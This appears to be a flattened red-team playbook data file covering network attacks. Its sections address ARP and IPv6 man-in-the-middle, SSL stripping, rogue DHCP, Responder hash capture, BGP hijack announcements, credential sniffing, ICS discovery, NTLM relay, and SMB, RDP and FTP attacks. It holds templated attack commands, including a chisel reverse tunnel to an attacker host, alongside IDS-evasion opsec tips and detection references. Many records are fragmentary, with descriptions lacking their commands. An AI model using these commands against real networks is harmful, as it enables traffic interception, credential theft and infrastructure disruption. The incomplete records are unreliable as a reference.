network_recon.description: Internal network reconnaissance to map infrastructure, routing, and devices.

commands.description: Live host discovery via ICMP ping sweep.
ARP scan for live hosts (layer 2 — no ICMP needed).

network_recon.prerequisites: Network access; nmap or equivalent scanner; target IP range
network_recon.opsec: Full port scans generate significant IDS alerts. Use -sS (SYN) stealth scan, slow timing (-T2), fragmentation (-f). Target specific ports first.
network_recon.detection_ref: IDS signatures for port scanning; Suricata/Snort scan detection rules; anomalous connection rate from single source

arp_mitm.description: ARP spoofing and Man-in-the-Middle attacks on local networks.

commands.description: ARP poison to intercept traffic between victim and gateway.
Enable IP forwarding to avoid dropping intercepted traffic.

commands.command: bettercap -iface {interface} -eval "net.probe on; arp.spoof on; net.sniff on"

commands.description: SSL strip to downgrade HTTPS to HTTP.
commands.command: bettercap -iface {interface} -eval "net.probe on; arp.spoof on; https.proxy on; net.sniff on"

commands.description: Capture credentials from MITM position with Wireshark.

arp_mitm.prerequisites: Layer 2 access to same network segment; ARP spoofing tool (arpspoof, Bettercap)
arp_mitm.opsec: ARP spoofing is noisy — all hosts on segment detect it. Use targeted ARP poisoning (specific host pair). Enable IP forwarding to avoid dropping traffic.
arp_mitm.detection_ref: Dynamic ARP Inspection on managed switches; ARP cache anomaly monitoring; network-based IDS for gratuitous ARP floods

vlan_hopping.description: Bypassing VLAN segmentation via switch configuration abuse.

commands.description: Double-tagging VLAN hop — send double 802.1Q tagged frame.
Configure attacker interface to trunk mode for full VLAN access.

vlan_hopping.prerequisites: Switch port in auto-trunk mode; attacker can send 802.1Q frames; or access to native VLAN
vlan_hopping.opsec: Double-tagging VLAN hopping is one-way (no return traffic without second hop). Switch spoofing requires trunk negotiation to succeed.
vlan_hopping.detection_ref: Disable auto-trunking (switchport nonegotiate); native VLAN isolation; 802.1Q monitoring on access ports

dhcp_attacks.description: DHCP starvation and rogue server attacks.

commands.description: DHCP starvation — exhaust IP pool with fake requests.
Set up rogue DHCP server to redirect traffic.
commands.command: use auxiliary/server/dhcp; set SRVHOST {lhost}; set ROUTER {gateway}; set DNSSERVER {lhost}; run

commands.description: Rogue DHCP with dnsmasq for DNS redirect.

dhcp_attacks.prerequisites: Network access to DHCP broadcast domain; DHCP starvation or rogue server capability
dhcp_attacks.opsec: DHCP starvation (exhausting IP pool) is disruptive — avoid in production. Rogue DHCP is more targeted but still detectable via DHCP snooping.
dhcp_attacks.detection_ref: DHCP snooping on managed switches; rogue DHCP detection in network monitoring; DHCP server log anomalies

dns_attacks.description: DNS spoofing, poisoning, and amplification attacks.

commands.description: DNS spoofing in MITM position with dnsspoof.
Responder — capture NTLMv2 via LLMNR/NBT-NS/mDNS poisoning.
mDNS/Bonjour enumeration for local service discovery.
NBT-NS broadcast poisoning with Responder (captures NTLMv2).
commands.command: python3 Responder.py -I {interface} -wrf -v  # Captures any NetBIOS name lookup on local segment

dns_attacks.prerequisites: Access to DNS query path (MITM or DNS server access); or DNS cache poisoning vulnerability
dns_attacks.opsec: DNS cache poisoning requires timing precision. DNS hijacking via compromised resolver is more reliable. Use DNSSEC-aware detection evasion.
dns_attacks.detection_ref: DNSSEC validation; DNS response anomaly monitoring; split-horizon DNS; DNS query logging and analysis

snmp_exploitation.description: Exploiting SNMP misconfigurations for information disclosure and configuration changes.

commands.description: Enumerate system info via SNMP v1/v2c.
Write community string abuse — change device config.

snmp_exploitation.prerequisites: SNMP accessible on target; default community strings (public/private) or known community string
snmp_exploitation.opsec: SNMP v1/v2c community strings are unencrypted. snmpwalk generates many requests — use targeted OID queries. SNMPv3 requires auth bypass.
snmp_exploitation.detection_ref: Firewall blocking SNMP from unauthorized sources; SNMP access logging; migration to SNMPv3 with auth+encryption

bgp_routing_attacks.description: BGP route hijacking and manipulation attacks against internet routing infrastructure.

commands.description: Enumerate BGP peers and ASN information.
Check BGP route origin with RPKI validator.
Simulate BGP route announcement with ExaBGP.
commands.command: # exabgp.conf: neighbor {peer_ip} { router-id {our_ip}; local-address {our_ip}; local-as {our_asn}; peer-as {peer_asn}; static { route {prefix} next-hop {nh}; } }

commands.description: Monitor BGP routing changes with BGPmon.
Use Routeviews to verify prefix origin and detect hijacks.

bgp_routing_attacks.prerequisites: BGP session access (ISP relationship, compromised router, or route server access)
bgp_routing_attacks.opsec: BGP hijacking is highly visible on BGP monitoring services (BGPmon, RIPE). Test impact carefully — can cause widespread outages.
bgp_routing_attacks.detection_ref: BGP route monitoring services; RPKI validation; anomalous prefix announcement alerts; NOC monitoring

ipv6_attacks.description: IPv6-specific attacks including rogue router advertisements and DHCPv6 abuse.

commands.description: Send rogue IPv6 Router Advertisement to redirect traffic.
Combined IPv6 RA + DHCPv6 MITM with ntlmrelayx.
Enumerate IPv6 link-local addresses on the network.
Send ICMPv6 Neighbor Solicitation for target discovery.

ipv6_attacks.prerequisites: IPv6 enabled but not managed (common in Windows networks); mitm6 or similar
ipv6_attacks.opsec: mitm6 sends ICMPv6 router advertisements — detectable. Target Windows clients preferring IPv6 by default. Works even when IPv6 is 'disabled' on network.
ipv6_attacks.detection_ref: DHCPv6 snooping; RA Guard on switches; monitoring for rogue IPv6 router advertisements; disable IPv6 if unused

traffic_interception.description: Passively and actively intercepting network traffic for credential and data capture.

commands.description: Capture all traffic on interface with tcpdump — full packet content.
Extract HTTP credentials from pcap with Wireshark tshark.
Extract NTLM hashes from pcap with PCredz.
Intercept and decode FTP/Telnet/HTTP with ngrep.
commands.command: ngrep -W byline -d {interface} 'pass\|user\|login' tcp port 21 or tcp port 23 or tcp port 80

traffic_interception.prerequisites: Network tap, SPAN port, or MITM position; packet capture capability
traffic_interception.opsec: Passive sniffing leaves no network trace. SPAN port configuration requires switch access. Active MITM generates detectable traffic.
traffic_interception.detection_ref: Promiscuous mode detection on hosts; network tap audit; switch SPAN port authorization controls; encrypted traffic enforcement

Targeted BSSID monitoring on specific channel.

Post-compromise lateral movement from compromised WiFi client.

wifi_attacks.prerequisites: Wireless adapter with monitor mode; target SSID in range; for WPA attacks: captured handshake
wifi_attacks.opsec: Evil twin attacks require deauth — this is illegal in many jurisdictions and highly noisy. Use passive monitoring first. PMKID attacks require no deauth.
wifi_attacks.detection_ref: Wireless intrusion detection systems (WIDS); deauth flood detection; rogue AP detection; 802.11w management frame protection

industrial_ot_attacks.description: Scanning and attacking Industrial Control Systems and OT networks.

commands.description: Discover industrial devices with Nmap ICS scripts.

commands.command: shodan search 'port:102 Siemens' OR 'port:502 Modbus' --fields ip_str,port,org,os

commands.description: ICS vulnerability scan with Redpoint Nmap scripts.

industrial_ot_attacks.prerequisites: Access to OT network (air-gapped or connected ICS/SCADA); protocol knowledge (Modbus, DNP3, IEC 61850)
industrial_ot_attacks.opsec: OT networks are extremely sensitive — any disruption can cause physical damage or safety incidents. Passive reconnaissance only unless explicitly authorized.
industrial_ot_attacks.detection_ref: OT-specific IDS (Dragos, Claroty, Nozomi); protocol anomaly detection; asset inventory monitoring; segmentation enforcement

network_tunneling.description: Advanced tunneling and covert channel techniques for C2 and data exfiltration.

commands.description: HTTP/S tunneling via chisel for firewall egress.
commands.command: # Attacker: chisel server -p 8080 --reverse\n# Target: chisel client {attacker}:8080 R:socks

commands.description: Port knocking sequence to open firewall rule.
commands.command: for port in {knock_seq}; do nmap -Pn --host-timeout 201ms --max-retries 0 -p $port {target} 2>/dev/null; done && ssh {user}@{target}

commands.description: Proxy via HTTP CONNECT through web proxy.

network_tunneling.prerequisites: Outbound connectivity on allowed protocol (DNS, ICMP, HTTP); tunnel tool on both ends
network_tunneling.opsec: DNS tunneling has high query volume and unusual TTLs — detectable. ICMP tunneling via ping is stealthy in permissive environments. HTTP tunneling over port 80/443 blends best.
network_tunneling.detection_ref: DNS query rate and entropy anomalies; ICMP payload inspection; HTTP proxy logging for tunneling patterns; DPI appliances

ntlm_relay_attacks.prerequisites: Ability to capture NTLM authentication (LLMNR poisoning, MITM); target with SMB signing disabled
ntlm_relay_attacks.opsec: Responder+ntlmrelayx is noisy — generates many multicast responses. Use --lm flag to downgrade auth. Target specific high-value systems for relay.
ntlm_relay_attacks.detection_ref: SMB signing enforcement; LLMNR/NBT-NS disabled via GPO; network IDS for relay patterns; Event 4624 Type 3 from unexpected sources

llmnr_nbt_poisoning.prerequisites: Same network segment as targets; LLMNR/NBT-NS enabled on Windows (default); Responder or similar
llmnr_nbt_poisoning.opsec: Responder captures hashes passively. Only respond to queries for non-existent hosts to avoid disruption. Log all captured hashes immediately.
llmnr_nbt_poisoning.detection_ref: Disable LLMNR/NBT-NS via GPO; Event 4625 spike from Responder; network monitoring for LLMNR traffic; MDNS anomaly detection

nmap_reference.description: Nmap scan options and flags reference for network enumeration.

commands.description: Ping scan using ICMP Echo Requests.

Use specific DNS server for resolution.
Set maximum retries for port scans.

nmap_reference.prerequisites: nmap installed; network access to target range
nmap_reference.opsec: Aggressive scans (-A, -T4) generate IDS alerts. Use -T2 slow timing for stealth. SYN scan (-sS) is quieter than connect scan (-sT).
nmap_reference.detection_ref: IDS for port scan patterns; anomalous connection rate; Suricata/Snort scan detection rules

attacking_ftp.description: Attacking FTP services — anonymous access, credential brute force, and file operations.

commands.description: Connect to FTP service with ftp client.
Connect to FTP with netcat for banner grab.
Connect to FTP with encrypted connection (FTPS).
Download all available files from FTP anonymously.

attacking_ftp.prerequisites: Network access to FTP port 21; target running FTP service
attacking_ftp.opsec: Anonymous FTP access is common on misconfigured servers. Brute force generates multiple failed login events.
attacking_ftp.detection_ref: FTP audit logging; failed login threshold alerts; anomalous download volume from FTP; anonymous FTP access monitoring

attacking_smb.description: Attacking SMB services — null sessions, share enumeration, relay attacks, and credential abuse.

commands.description: Execute command over SMB with CrackMapExec.
Extract SAM database hashes via SMB.
NTLM relay to dump SAM database.
NTLM relay with PowerShell reverse shell payload.

attacking_smb.prerequisites: Network access to SMB port 445; null session or valid credentials
attacking_smb.opsec: Null sessions are heavily monitored. Use credentialed access. NTLM relay requires positioning between victim and target.
attacking_smb.detection_ref: Event 4625 null session attempts; SMB signing enforcement; NTLM relay detection; CrackMapExec behavioral signatures

attacking_rdp.description: Attacking RDP services — brute force, Pass-the-Hash, session hijacking.

commands.description: Connect to RDP from Linux with rdesktop.
RDP session hijacking — impersonate user without password.
Enable Restricted Admin Mode for PtH RDP.

attacking_rdp.prerequisites: Network access to RDP port 3389; target running RDP service
attacking_rdp.opsec: RDP brute force generates Event 4625. Session hijacking requires console/admin access. Restricted Admin Mode must be enabled for PtH.
attacking_rdp.detection_ref: Event 4625/4624 RDP logon; failed login rate monitoring; Restricted Admin Mode usage; unusual session reconnection patterns

attacking_email_services.description: Attacking email services — SMTP user enumeration, Office365 spraying, POP3/IMAP brute force.

commands.description: Connect to SMTP service for banner.

attacking_email_services.prerequisites: Network access to mail service ports (25, 110, 143, 993, 995); target email server accessible
attacking_email_services.opsec: SMTP user enumeration via RCPT TO is logged. Office365 spray via o365spray is harder to detect than direct SMTP. Rate limit attempts.
attacking_email_services.detection_ref: SMTP authentication logging; Office365 Smart Lockout; anomalous login patterns; MFA enforcement

footprinting_services.description: Service-specific footprinting commands for DNS, SNMP, NFS, MSSQL, Oracle, and remote management protocols.

Connect to MSSQL with impacket mssqlclient.

footprinting_services.prerequisites: Network access to target services; appropriate tools installed
footprinting_services.opsec: Service-specific enumeration generates service logs. Use targeted queries. Start with passive (OSINT, crt.sh) before active scanning.
footprinting_services.detection_ref: Service audit logs; anomalous connection patterns; IDS for enumeration tools; rate limiting on authentication services
